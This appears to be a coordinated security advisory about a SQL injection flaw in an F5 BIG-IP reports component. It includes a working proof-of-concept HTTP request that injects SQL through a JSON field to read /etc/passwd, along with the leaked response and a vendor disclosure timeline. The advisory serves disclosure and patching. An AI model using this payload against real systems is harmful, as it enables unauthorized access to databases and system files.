Vulnerability overview/description:
-----------------------------------
A SQL injection vulnerability exists in a BIG-IP component. This enables an
authenticated attacker to access the MySQL database with the rights of MySQL
user "root" (= highest privileges).

Furthermore an attacker can access files in the file system with the rights of
the "mysql" OS user.


Proof of concept:
-----------------
The following exploit shows how files can be extracted from the file system:

POST /sam/admin/reports/php/saveSettings.php HTTP/1.1
Host: bigip
Cookie: BIGIPAuthCookie=*VALID_COOKIE*
Content-Length: 119

{
    "id": 2,
    "defaultQuery": "XX', ext1=(SELECT MID(LOAD_FILE('/etc/passwd'),0,60)) --
x" }

Note: target fields are only VARCHAR(60) thus MID() is used for extracting
data.

A request to /sam/admin/reports/php/getSettings.php returns the data:

HTTP/1.1 200 OK
...

{success:true,totalCount:1,rows:[{"id":"2","user":"admin","defaultQuery":"XX","ext1":"root:x:0:0:root:\/root:\/bin\/bash\nbin:x:1:1:bin:\/bin:\/sbin\/nol","ext2":""}]}



Vulnerable / tested versions:
-----------------------------
The vulnerability has been verified to exist in the F5 BIG-IP version 11.2.0.

Successful exploitation was possible with Application Security (ASM) or Access
Policy (APM) enabled.


Vendor contact timeline:
------------------------
2012-10-04: Sending advisory draft and proof of concept.
2012-11-21: Vendor announces that fix will be provided with 11.2.0 HF3 and 
            11.2.1 HF3.
2013-01-22: SEC Consult releases coordinated security advisory.
